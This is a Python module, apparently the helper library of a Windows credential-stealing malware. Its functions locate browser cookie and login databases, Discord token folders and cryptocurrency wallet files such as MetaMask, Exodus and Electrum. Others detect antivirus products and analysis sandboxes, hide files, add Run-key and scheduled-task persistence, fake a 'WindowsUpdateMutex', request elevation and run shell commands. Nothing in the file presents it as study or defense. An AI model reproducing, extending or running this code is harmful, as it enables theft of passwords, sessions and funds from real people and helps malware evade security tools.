import os
import sys
import json
import time
import ctypes
import base64
import random
import string
import shutil
import tempfile
import subprocess
import winreg
import hashlib
import threading
from datetime import datetime
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import win32crypt
import win32api
import win32con
import win32process
import win32security
import win32event
import win32gui
import win32clipboard
import win32file
import win32pipe
import psutil
import wmi

__version__ = "1.0.0"
__author__ = "Colin"

# Core utility functions
def get_appdata():
    return os.getenv("APPDATA")

def get_localappdata():
    return os.getenv("LOCALAPPDATA")

def get_temp_dir():
    return tempfile.gettempdir()

def generate_random_string(length=32):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def generate_key():
    return Fernet.generate_key()

def encrypt_data(data, key):
    try:
        cipher = Fernet(key)
        if isinstance(data, str):
            data = data.encode()
        return cipher.encrypt(data)
    except:
        return None

def decrypt_data(encrypted_data, key):
    try:
        cipher = Fernet(key)
        return cipher.decrypt(encrypted_data).decode()
    except:
        return None

def get_hwid():
    try:
        c = wmi.WMI()
        for cpu in c.Win32_Processor():
            cpu_id = cpu.ProcessorId.strip()
            break
        for disk in c.Win32_DiskDrive():
            disk_serial = disk.SerialNumber.strip()
            break
        hwid = hashlib.sha256(f"{cpu_id}{disk_serial}".encode()).hexdigest()
        return hwid
    except:
        return hashlib.sha256(generate_random_string().encode()).hexdigest()

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def elevate_privileges():
    try:
        if not is_admin():
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
            return True
        return True
    except:
        return False

def get_process_list():
    processes = []
    try:
        for proc in psutil.process_iter(['pid', 'name', 'exe', 'cmdline']):
            processes.append({
                "pid": proc.info['pid'],
                "name": proc.info['name'],
                "exe": proc.info['exe'],
                "cmdline": proc.info['cmdline']
            })
    except:
        pass
    return processes

def kill_process_by_name(process_name):
    killed = []
    try:
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'] and process_name.lower() in proc.info['name'].lower():
                proc.kill()
                killed.append(proc.info['pid'])
    except:
        pass
    return killed

def set_file_hidden(path):
    try:
        FILE_ATTRIBUTE_HIDDEN = 0x02
        win32api.SetFileAttributes(path, FILE_ATTRIBUTE_HIDDEN)
        return True
    except:
        return False

def set_file_system(path):
    try:
        FILE_ATTRIBUTE_SYSTEM = 0x04
        win32api.SetFileAttributes(path, FILE_ATTRIBUTE_SYSTEM)
        return True
    except:
        return False

def create_mutex(mutex_name="Global\\WindowsUpdateMutex"):
    try:
        import win32event
        handle = win32event.CreateMutex(None, False, mutex_name)
        if win32api.GetLastError() == 183:
            return False
        return True
    except:
        return True

def check_mutex(mutex_name="Global\\WindowsUpdateMutex"):
    try:
        handle = win32event.OpenMutex(win32con.MUTEX_ALL_ACCESS, False, mutex_name)
        if handle:
            win32api.CloseHandle(handle)
            return True
    except:
        pass
    return False

def get_antivirus_list():
    av_list = []
    av_processes = [
        "avast", "avg", "avira", "bitdefender", "kaspersky", "mcafee", 
        "norton", "symantec", "windows defender", "msmpeng", "malwarebytes",
        "eset", "trend micro", "comodo", "panda", "sophos", "webroot"
    ]
    try:
        for proc in psutil.process_iter(['name']):
            proc_name = proc.info['name'].lower()
            for av in av_processes:
                if av in proc_name:
                    av_list.append(proc.info['name'])
                    break
    except:
        pass
    return av_list

def is_sandbox():
    sandbox_indicators = [
        "sandboxie", "cuckoo", "any.run", "joebox", "anubis", 
        "malwr", "hybrid-analysis", "virus total", "virustotal"
    ]
    try:
        processes = get_process_list()
        for proc in processes:
            proc_name = proc['name'].lower() if proc['name'] else ""
            for indicator in sandbox_indicators:
                if indicator in proc_name:
                    return True
        
        # Check for sandbox dlls
        sandbox_dlls = ["sbiedll.dll", "dbghelp.dll", "api_log.dll", "dir_watch.dll"]
        for dll in sandbox_dlls:
            try:
                if os.path.exists(os.path.join(os.getenv("SystemRoot"), "System32", dll)):
                    return True
            except:
                pass
        
        # Check screen resolution for sandbox
        try:
            screen_width = win32api.GetSystemMetrics(0)
            screen_height = win32api.GetSystemMetrics(1)
            if screen_width < 800 or screen_height < 600:
                return True
        except:
            pass
        
        # Check RAM
        try:
            total_ram = psutil.virtual_memory().total
            if total_ram < 4 * 1024 * 1024 * 1024:  # Less than 4GB
                return True
        except:
            pass
        
        # Check CPU cores
        try:
            cpu_count = psutil.cpu_count()
            if cpu_count < 2:
                return True
        except:
            pass
        
    except:
        pass
    
    return False

def xor_encrypt(data, key):
    if isinstance(data, str):
        data = data.encode()
    if isinstance(key, str):
        key = key.encode()
    return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])

def xor_decrypt(encrypted_data, key):
    return xor_encrypt(encrypted_data, key)

def base64_encode(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.b64encode(data).decode()

def base64_decode(data):
    return base64.b64decode(data.encode()).decode()

def aes_encrypt(data, key):
    try:
        iv = os.urandom(16)
        cipher = Cipher(algorithms.AES(key.encode() if isinstance(key, str) else key), modes.CBC(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        
        # Pad data
        pad_length = 16 - (len(data) % 16)
        data = data + bytes([pad_length] * pad_length)
        
        encrypted = encryptor.update(data) + encryptor.finalize()
        return iv + encrypted
    except:
        return None

def aes_decrypt(encrypted_data, key):
    try:
        iv = encrypted_data[:16]
        encrypted = encrypted_data[16:]
        cipher = Cipher(algorithms.AES(key.encode() if isinstance(key, str) else key), modes.CBC(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        decrypted = decryptor.update(encrypted) + decryptor.finalize()
        
        # Unpad
        pad_length = decrypted[-1]
        return decrypted[:-pad_length]
    except:
        return None

def get_browser_paths():
    browser_paths = []
    localappdata = get_localappdata()
    appdata = get_appdata()
    
    browsers = [
        {
            "name": "Chrome",
            "path": os.path.join(localappdata, "Google", "Chrome", "User Data"),
            "cookie_path": "Network\\Cookies",
            "login_path": "Login Data"
        },
        {
            "name": "Brave",
            "path": os.path.join(localappdata, "BraveSoftware", "Brave-Browser", "User Data"),
            "cookie_path": "Network\\Cookies",
            "login_path": "Login Data"
        },
        {
            "name": "Edge",
            "path": os.path.join(localappdata, "Microsoft", "Edge", "User Data"),
            "cookie_path": "Network\\Cookies",
            "login_path": "Login Data"
        },
        {
            "name": "Opera",
            "path": os.path.join(appdata, "Opera Software", "Opera Stable"),
            "cookie_path": "Network\\Cookies",
            "login_path": "Login Data"
        },
        {
            "name": "Firefox",
            "path": os.path.join(appdata, "Mozilla", "Firefox", "Profiles"),
            "cookie_path": "cookies.sqlite",
            "login_path": "logins.json"
        }
    ]
    
    for browser in browsers:
        if os.path.exists(browser["path"]):
            browser_paths.append(browser)
    
    return browser_paths

def get_discord_paths():
    paths = []
    localappdata = get_localappdata()
    appdata = get_appdata()
    
    discord_paths = [
        os.path.join(appdata, "discord"),
        os.path.join(appdata, "discordcanary"),
        os.path.join(appdata, "discordptb"),
        os.path.join(localappdata, "Discord"),
        os.path.join(localappdata, "DiscordCanary"),
        os.path.join(localappdata, "DiscordPTB")
    ]
    
    for path in discord_paths:
        if os.path.exists(path):
            paths.append(path)
    
    return paths

def get_wallet_paths():
    wallet_paths = {}
    appdata = get_appdata()
    localappdata = get_localappdata()
    
    wallets = {
        "metamask": [
            os.path.join(localappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "nkbihfbeogaeaoehlefnkodbefgpgknn"),
            os.path.join(localappdata, "Microsoft", "Edge", "User Data", "Default", "Local Extension Settings", "ejbalbakoplchlghecdalmeeeajnimhm")
        ],
        "exodus": [
            os.path.join(appdata, "Exodus", "exodus.wallet")
        ],
        "atomic": [
            os.path.join(appdata, "atomic", "Local Storage", "leveldb")
        ],
        "electrum": [
            os.path.join(appdata, "Electrum", "wallets")
        ],
        "bitcoin_core": [
            os.path.join(appdata, "Bitcoin", "wallets")
        ],
        "coinbase": [
            os.path.join(localappdata, "Coinbase", "Coinbase.exe")
        ]
    }
    
    for wallet_name, paths in wallets.items():
        for path in paths:
            if os.path.exists(path):
                if wallet_name not in wallet_paths:
                    wallet_paths[wallet_name] = []
                wallet_paths[wallet_name].append(path)
    
    return wallet_paths

def set_startup_registry(name, path):
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, name, 0, winreg.REG_SZ, path)
        winreg.CloseKey(key)
        return True
    except:
        return False

def remove_startup_registry(name):
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, name)
        winreg.CloseKey(key)
        return True
    except:
        return False

def create_scheduled_task(name, path, interval_minutes=60):
    try:
        cmd = f'schtasks /create /tn "{name}" /tr "{path}" /sc minute /mo {interval_minutes} /f'
        subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except:
        return False

def get_system_info():
    info = {
        "hostname": os.getenv("COMPUTERNAME"),
        "username": os.getenv("USERNAME"),
        "os": "Windows",
        "os_version": "",
        "architecture": "x64" if sys.maxsize > 2**32 else "x86",
        "hwid": get_hwid(),
        "admin": is_admin(),
        "antivirus": get_antivirus_list(),
        "sandbox": is_sandbox()
    }
    
    try:
        import platform
        info["os_version"] = platform.version()
        info["platform"] = platform.platform()
    except:
        pass
    
    try:
        c = wmi.WMI()
        for os in c.Win32_OperatingSystem():
            info["os_name"] = os.Caption
            info["os_architecture"] = os.OSArchitecture
            info["serial_number"] = os.SerialNumber
            info["version"] = os.Version
            break
    except:
        pass
    
    try:
        c = wmi.WMI()
        for gpu in c.Win32_VideoController():
            info["gpu"] = gpu.Name
            break
    except:
        pass
    
    try:
        c = wmi.WMI()
        for cpu in c.Win32_Processor():
            info["cpu"] = cpu.Name
            info["cores"] = cpu.NumberOfCores
            break
    except:
        pass
    
    try:
        total_ram = psutil.virtual_memory().total
        info["ram_gb"] = round(total_ram / (1024**3), 2)
    except:
        pass
    
    return info

def execute_command(cmd):
    try:
        result = subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL)
        return result.decode()
    except:
        return None